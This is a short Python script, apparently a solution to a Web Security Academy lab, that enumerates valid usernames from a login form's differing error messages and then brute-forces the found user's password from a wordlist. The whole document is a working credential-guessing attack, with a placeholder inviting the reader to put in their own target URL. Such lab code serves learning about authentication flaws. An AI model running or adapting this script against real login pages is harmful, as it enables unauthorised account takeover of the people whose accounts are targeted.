import requests
from tqdm import tqdm

fd = open('usernames.txt', 'r')
wordlist = fd.read()
fd.close()
usernames = wordlist.split('\n')

fd = open('passwords.txt', 'r')
passwords = fd.read()
fd.close()
passwords = passwords.split('\n')

url = "https://0ab00028035968588068f3d3000b0017.web-security-academy.net/login" #Your URL

data = {
    'username':'',
    'password':'testpass'
}

# To check the users
with requests.session() as s:
    for username in tqdm(usernames):
        data['username'] = username
        r = s.post(url=url, data=data)
        if 'Invalid username' not in r.text:
            print(f"{username=} is there.")
            break

# To bruteforce password
with requests.session() as s:
    for password in tqdm(passwords):
        data['password'] = password
        r = s.post(url=url, data=data)
        if 'Incorrect password' not in r.text:
            print(f"{data['username']} : {data['password']}")
            break